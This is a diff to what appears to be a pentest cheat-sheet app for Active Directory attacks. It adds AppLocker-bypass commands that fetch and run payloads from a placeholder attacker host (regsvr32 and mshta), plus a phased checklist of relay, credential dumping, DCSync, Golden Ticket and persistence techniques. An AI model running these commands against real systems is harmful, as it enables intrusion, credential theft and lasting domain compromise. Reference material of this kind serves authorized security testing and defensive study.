+    gets: 'Code execution using Microsoft-signed binaries that are explicitly trusted by AppLocker default rules',
+    tags: ['have-foothold','cat-privesc'],
+    cmd: `# regsvr32 Squiblydoo — most used, bypasses AppLocker publisher rules
+# Payload: COM scriptlet (.sct) hosted on attacker server
+regsvr32 /s /n /u /i:http://<ATTACKER>/payload.sct scrobj.dll
+# Local file variant:
+regsvr32 /s /n /u /i:C:\\Temp\\payload.sct scrobj.dll
+
+# mshta — execute HTA (HTML Application) over HTTP
+mshta http://<ATTACKER>/payload.hta
+# Inline VBScript:
+mshta "vbscript:CreateObject("WScript.Shell").Run("cmd.exe")(window.close)"
+
+# MSBuild — execute inline C# Roslyn task (bypasses AppLocker)
+# Requires .csproj file on disk (generate with frameworks/tools)
+MSBuild.exe C:\\Temp\\payload.csproj
+
+# InstallUtil — execute C# code via Uninstall method
+# Compile a C# exe that has [System.ComponentModel.RunInstaller(true)] class
+InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Temp\\payload.exe
+
+# cmstp — COM Surrogate execution from INF file
+# Requires .inf file with RegisterOCXSection pointing to a DLL
+cmstp.exe /ni /s C:\\Temp\\payload.inf
+
+# wscript/cscript — VBScript / JScript execution
+wscript.exe C:\\Temp\\payload.vbs
+cscript.exe //nologo C:\\Temp\\payload.js`,
+    note: 'These techniques work in Constrained Language Mode (CLM) PowerShell environments. regsvr32 is the most reliable — does NOT require admin, works from standard user, bypasses AppLocker publisher/hash/path rules. MSBuild requires .NET Framework present (always available on AD domain members).',
+    warn: 'Sysmon Event 1 — all of these create child processes under the LOLBin parent, which is highly anomalous. WDAC (Windows Defender Application Control) in strict mode blocks most of these. regsvr32 with HTTP arguments is blocked by modern EDR out of the box.',
+    ref: 'https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/'
+  },
 ];
 
 // ── Render ────────────────────────────────────────────────────────────────────
@@ -5888,88 +7187,136 @@ const FLOW = [
   {id:'p0',label:'Pre-Flight Checks',color:'#8b949e',jump:{have:[],cat:['cat-enum']},items:[
     'Identify DC IP — nmap port 88/389/53 or ipconfig /all from foothold',
     'Note domain FQDN (from nmap, LDAP, or DNS reverse lookup)',
-    'Check if ADCS present — port 443, try http://&lt;IP&gt;/certsrv/',
-    'Check if Exchange present — port 443/25, look for OWA login page',
-    'Check WSUS — port 8530 HTTP = potentially exploitable',
+    'Check if ADCS present — port 443, probe http://&lt;IP&gt;/certsrv/ (401 = exists)',
+    'Check if Exchange present — port 443/25/587, look for OWA login page',
+    'Check WSUS — port 8530 HTTP = potentially injectable',
     'Check if MSSQL exposed — port 1433',
+    'Check if SCCM present — port 8443, note IP for later enumeration',
     'Confirm IP scope — ranges in/out of scope',
+    'SMB signing across subnet — nxc smb &lt;subnet&gt;/24 --gen-relay-list relay_targets.txt',
+    'LDAP signing check — nxc ldap &lt;DC-IP&gt; -u "" -p "" -M ldap-checker',
+    'IPv6 active check — nxc smb &lt;subnet&gt;/24 --ipv6 (mitm6 viable if hosts respond)',
   ]},
   {id:'p1',label:'Phase 1 — No Credentials',color:'#f85149',jump:{have:['have-nocreds'],cat:[]},items:[
-    'SMB null/guest session — CME smb -u guest -p "" --shares',
-    'RID cycling / lookupsid — if null session works, enumerate all users',
+    'SMB null/guest session — nxc smb -u "" -p "" --shares',
+    'RID cycling / lookupsid — if null session works, enumerate all users → users.txt',
     'LDAP anonymous bind — windapsearch -U or ldapsearch -x',
-    'Kerbrute username enumeration — against kerberos :88',
-    'AS-REP roasting — GetNPUsers with generated username list',
-    'LLMNR/NBT-NS poisoning — start Responder',
-    'Check SMB signing — CME --gen-relay-list; if disabled set up ntlmrelayx',
-    'NTLM relay attack if SMB signing is off',
-    'Coercion (PetitPotam unauthenticated if unpatched) → relay to LDAP/ADCS',
+    'Kerbrute username enumeration — against Kerberos :88 (zero lockout risk)',
+    'AS-REP roasting — GetNPUsers with generated username list (no creds needed)',
+    'LLMNR/NBT-NS poisoning — start Responder (leave running, check logs every 10 min)',
+    'NTLM relay attack if SMB signing is off — ntlmrelayx -tf relay_targets.txt',
+    'Coercion (PetitPotam unauthenticated if unpatched KB5005413) → relay to LDAP/ADCS',
+    'Coercer scan mode — python3 Coercer.py scan -t &lt;target&gt; (lists vulnerable methods, no trigger)',
+    'Password spray — check lockout policy first; 1 attempt per window against users.txt',
   ]},
   {id:'p2',label:'Phase 2 — Valid Credentials',color:'#ffa657',jump:{have:['have-password'],cat:[]},items:[
-    'Validate creds — CME smb &lt;DC-IP&gt; -u &lt;user&gt; -p &lt;pass&gt;',
-    'Check lockout policy BEFORE spraying — CME --pass-pol',
+    'Validate creds — nxc smb &lt;DC-IP&gt; -u &lt;user&gt; -p &lt;pass&gt;',
+    'Check lockout policy BEFORE spraying — nxc smb --pass-pol + nxc ldap -M get-pso (PSOs)',
     'Password spray — 1 attempt per lockout window, --continue-on-success',
-    'CME --users → scan description fields for plaintext passwords',
-    'Spider all non-default SMB shares — look for .ps1 .bat .xml .config files',
-    'BloodHound collection — bloodhound-python or SharpHound',
-    'Kerberoasting — GetUserSPNs → crack hashes offline',
-    'AS-REP roasting with valid creds (catches all preauth-disabled users)',
-    'Full LDAP dump — ldapdomaindump or windapsearch',
-    'ADCS enumeration — certipy find -vulnerable -enabled -stdout (if ADCS present)',
-    'LAPS check — CME -M laps',
-    'gMSA check — nxc ldap --gmsa',
-    'adPEAS remote enumeration from Linux',
+    '⭐ Run First-Creds Quick Wins checklist (all in parallel): smb/ldap/winrm/mssql sweep, BH collect, Kerberoast, LAPS, gMSA, spooler/webdav check, delegation scan',
+    'BloodHound collection — bloodhound-python -c All --zip → import into BH CE',
+    'Mark current user as Owned in BloodHound — run "Shortest Paths from Owned Principals"',
+    'ADCS enumeration — certipy find -vulnerable -enabled -stdout (any ESC = direct DA path)',
+    'Kerberoasting — GetUserSPNs -request → crack with hashcat -m 13100',
+    'AS-REP roasting with valid creds (catches ALL preauth-disabled users)',
+    'CVE module scan — nxc smb &lt;subnet&gt;/24 -M zerologon -M nopac -M petitpotam -M printnightmare -M ms17-010 -M smbghost',
+    'Coercion candidates — nxc smb &lt;subnet&gt;/24 -M spooler -M webdav; combine with relay_targets.txt',
+    'LAPS — nxc smb -M laps → direct local admin passwords if readable',
+    'gMSA — nxc ldap --gmsa → NT hash usable for PTH',
+    'Passwords in description fields — nxc ldap -M get-desc-users',
+    'Delegation scan — impacket-findDelegation → unconstrained/constrained/RBCD hosts mapped',
+    'BloodyAD writable scan — bloodyAD get writable --detail (shows all ACL-exploitable objects)',
+    'Shadow Credentials check — pywhisker list -d &lt;domain&gt; / BH WriteKeyCredentialLink edges',
+    'ADIDNS injection — bloodyAD add dnsRecord or dnstool.py --action add *.&lt;domain&gt; &lt;IP&gt;',
+    'Spider SMB shares — nxc smb -M spider_plus → hunt .ps1 .xml .config for hardcoded creds',
+    'Full LDAP dump — ldapdomaindump or windapsearch --full',
+    'Exchange group check — Get-DomainGroupMember "Exchange Windows Permissions" (WriteDACL → DCSync)',
+    'SCCM enumeration — nxc smb -M sccm or SharpSCCM find all → NAA creds / PXE abuse',
+    'MSSQL discovery — nxc mssql &lt;subnet&gt;/24 -d &lt;domain&gt;; (Pwn3d!) = sysadmin = xp_cmdshell',
+    'CVE-2023-23397 (Outlook) — if Exchange present: craft calendar invite with UNC path → NTLMv2 hash',
+    'adPEAS remote enumeration from Linux (automated full AD scan)',
+    'PingCastle healthcheck — scored misconfig report even without DA',
+    'ADRecon full snapshot — users/computers/ACLs/trusts in Excel/HTML',
   ]},
   {id:'p3',label:'Phase 3 — Foothold / Shell',color:'#79c0ff',jump:{have:['have-foothold'],cat:['cat-enum','cat-dump']},items:[
     'whoami /priv — check SeImpersonate, SeBackup, SeDebug, SeRestore',
     'whoami /groups — check Backup Operators, Server Operators, Account Operators',
-    'WinPEAS full run — autologon creds, weak services, stored credentials',
-    'AutoLogon creds — reg query Winlogon',
-    'LAPS — is ms-Mcs-AdmPwd readable? (CME laps or PowerView)',
-    'gMSA — GMSAPasswordReader or nxc ldap --gmsa',
-    'DPAPI — browser saved passwords, credential manager',
-    'LSASS dump — comsvcs.dll MiniDump, ProcDump, or nanodump',
+    'WinPEAS full run — AlwaysInstallElevated, AutoLogon, weak services, stored credentials',
+    'AutoLogon creds — reg query Winlogon DefaultPassword',
+    'WES-NG offline exploit suggester — systeminfo &gt; sysinfo.txt; python wesng.py sysinfo.txt',
+    'Watson / PrivescCheck — on-target CVE check (.NET or PowerShell, no upload concerns)',
+    'Seatbelt G — full security health check (AutoLogon, WSUS, PS logging, credential manager)',
+    'BeRoot — Windows LPE checker (services, tasks, registry, AlwaysInstallElevated)',
+    'HiveNightmare check — icacls C:\\Windows\\System32\\config\\SAM (any Everyone/Users read = VULNERABLE)',
+    'SMBGhost check — verify build 18362/18363 + missing KB4551762 before running PoC',
+    'SeImpersonatePrivilege → GodPotato (default); fallback: PrintSpoofer, JuicyPotatoNG, SigmaPotato',
+    'SeImpersonate missing on service account? → FullPowers.exe to restore full token privileges',
+    'SeBackupPrivilege → reg save HKLM\\SAM + HKLM\\SYSTEM → secretsdump.py LOCAL',
+    'SeDebugPrivilege → LSASS dump → extract creds / hashes',
+    'LAPS — is ms-Mcs-AdmPwd readable? (nxc laps or PowerView)',
+    'gMSA — GMSAPasswordReader or nxc ldap --gmsa → NT hash',
+    'DPAPI — SharpDPAPI triage / SharpChrome logins / credential manager',
+    'LSASS dump — comsvcs.dll MiniDump, ProcDump, or nanodump (EDR-safe syscalls)',
+    'KrbRelayUp — any domain user → SYSTEM when no LDAP signing enforced on DC',
     'Upload SharpHound → collect → download → import to BloodHound',
     'Mark current user as Owned in BloodHound (skull icon, right-click node)',
     'BloodHound: run "Shortest Paths from Owned Principals"',
-    'BloodHound: mark high-value targets (Exchange, ADCS, MSSQL servers)',
+    'BloodHound: mark high-value targets (Exchange, ADCS, MSSQL, SCCM servers)',
+    'MSSQL on this host? — tasklist | findstr sql or PowerView Get-SQLInstanceLocal',
   ]},
   {id:'p4',label:'Phase 4 — Lateral Movement',color:'#d2a8ff',jump:{have:['have-hash'],cat:['cat-lateral']},items:[
-    'CME PTH spray across subnet with --local-auth — find local admin reuse',
+    'PTH spray across subnet with --local-auth — find local admin password reuse (no LAPS)',
     'BloodHound: follow edges from Owned principals to new targets',
-    'ACL abuse — GenericAll / WriteDACL / WriteOwner / GenericWrite',
+    'ACL abuse — GenericAll / WriteDACL / WriteOwner / GenericWrite (PowerView or bloodyAD)',
     'Pass-the-Hash to machines where you are local admin',
-    'Overpass-the-Hash — NTLM hash → Kerberos TGT (Rubeus asktgt /rc4)',
-    'Find logged-in admins — PowerView Find-DomainUserLocation',
-    'Coercion attacks — PetitPotam/Coercer → relay to LDAP or AD CS',
+    'Overpass-the-Hash — NTLM hash → Kerberos TGT (Rubeus asktgt /rc4 or /aes256)',
+    'Find logged-in admins — PowerView Find-DomainUserLocation → DA sessions on reachable hosts',
+    'Coercion attacks — Coercer.py coerce / PetitPotam → relay to LDAP or ADCS',
     'Check Kerberos delegation edges in BloodHound',
-    'Token impersonation if SeImpersonatePrivilege (potato attacks)',
+    'Token impersonation if SeImpersonatePrivilege — GodPotato / PrintSpoofer / SigmaPotato',
+    'MSSQL lateral movement — mssqlclient.py → xp_cmdshell → SYSTEM; linked servers → lateral hop',
+    'mitm6 IPv6 MITM — mitm6 -d &lt;domain&gt; + ntlmrelayx --delegate-access → RBCD → DA',
+    'GPO abuse — BH WriteGPO/GpLink edge → SharpGPOAbuse --AddComputerTask',
+    'Exchange WriteDACL — if in Exchange Windows Permissions → Add-DomainObjectAcl -Rights DCSync',
+    'SCCM lateral movement — SCCM admin console → push script to all managed endpoints',
+    'DPAPI credential extraction — SharpDPAPI triage / SharpChrome logins across lateral targets',
+    'RemotePotato0 — local admin in Session 0 + DA in Session 1 → DCOM relay → NTLM → Enterprise Admin',
   ]},
   {id:'p5',label:'Phase 5 — Privilege Escalation → DA',color:'#d29922',jump:{have:['have-foothold'],cat:['cat-privesc','cat-adcs','cat-delegation']},items:[
-    'SeImpersonatePrivilege → GodPotato / PrintSpoofer → SYSTEM',
+    'SeImpersonatePrivilege → GodPotato / SigmaPotato / PrintSpoofer → SYSTEM',
     'SeBackupPrivilege → reg save SAM+SYSTEM → secretsdump LOCAL',
     'SeDebugPrivilege → LSASS dump → extract creds / hashes',
     'WriteDACL on domain → Add-ObjectACL → grant self DCSync rights',
     'Account Operators → Exchange Windows Permissions → WriteDACL → DCSync',
+    'Shadow Credentials — WriteKeyCredentialLink → pywhisker add → cert → NT hash of target',
+    'BloodyAD chain — get writable --detail → add shadowCredentials / add rbcd / add dcsync',
+    'KrbRelayUp — any domain user → SYSTEM when LDAP signing not enforced on DC',
     'BloodHound — Kerberoastable users with path to Domain Admins',
     'ADCS — certipy find -vulnerable -enabled -stdout → ESC1 / ESC4 / ESC8 (relay + cert)',
-    'Coercion → ESC8 — PetitPotam + ntlmrelayx --adcs → cert for DC → DCSync',
-    'Unconstrained delegation + coercion (PrinterBug/PetitPotam) → steal DC TGT',
+    'Coercion → ESC8 — Coercer/PetitPotam + ntlmrelayx --adcs → cert for DC$ → DCSync',
+    'Unconstrained delegation + coercion (Coercer/PetitPotam) → steal DC TGT → DCSync',
     'Constrained delegation S4U2Proxy → request TGS as Domain Admin',
-    'RBCD — GenericWrite on computer → configure delegation → S4U2Self',
+    'RBCD — GenericWrite on computer → bloodyAD add rbcd → S4U2Self → S4U2Proxy → DA',
     'DNSAdmins — inject malicious DLL via DNS service restart (→ SYSTEM on DC)',
-    'CVE: noPac / Zerologon / PrintNightmare — check patch level first',
+    'BadSuccessor (CVE-2025-29810) — CreateChild on OU → DMSA inherits DA group → bloodyAD add badSuccessor',
+    'CVE: noPac / ZeroLogon / PrintNightmare / ESC15 — check patch level before running PoC',
+    'PingCastle / ADRecon — structural vulnerability report for any path you might have missed',
   ]},
   {id:'p6',label:'Phase 6 — Domain Admin / Post-Exploitation',color:'#2ea043',jump:{have:['have-domainadmin'],cat:['cat-dump','cat-persist']},items:[
-    'DCSync — impacket-secretsdump → dump all domain hashes',
-    'Dump NTDS.dit — diskshadow / vssadmin / wbadmin (physical copy)',
+    'DCSync — secretsdump.py -just-dc → dump all domain hashes (krbtgt + every account)',
+    'Dump NTDS.dit — diskshadow / vssadmin / wbadmin (physical offline copy)',
     'CME --sam across domain — dump all local SAM hives',
-    'Golden Ticket — forge TGT with krbtgt hash (10-year persistence)',
-    'Create backdoor Domain Admin account',
-    'Cross-domain / cross-forest trust attacks — SID History, trust tickets',
-    'Persistence — DSRM password, Skeleton Key, WMI subscription, GPO abuse',
-    'Custom SSP (mimilib) — capture all future logins in plaintext',
-    'Document all findings, paths, and commands run with timestamps',
+    'Golden Ticket — forge TGT with krbtgt hash (10-year validity, domain-wide)',
+    'DPAPI domain backup key — secretsdump → dpapi_backupkey → decrypt ALL user masterkeys',
+    'Entra ID / hybrid pivot — AADInternals / AzureHound → cloud Global Admin via Entra Connect',
+    'Cross-domain / cross-forest trust attacks — SID History injection, inter-forest TGT, trust tickets',
+    'Persistence — AdminSDHolder ACE, Skeleton Key, DCShadow, Golden gMSA, DSRM password',
+    'Custom SSP (mimilib) — capture all future plaintext logins on DC',
+    'Create backdoor DA account (document and notify client)',
+    'PingCastle full report — score + SMB signing, LAPS, delegation, stale objects for deliverable',
+    'ADRecon full snapshot — users/computers/ACLs/trusts/GPOs in Excel/HTML for client report',
+    'Misconfigurations checklist — document all rc-misconfig findings with severity ratings',
+    'Document all findings, paths, and commands run with timestamps before cleanup',
   ]},
 ];
 
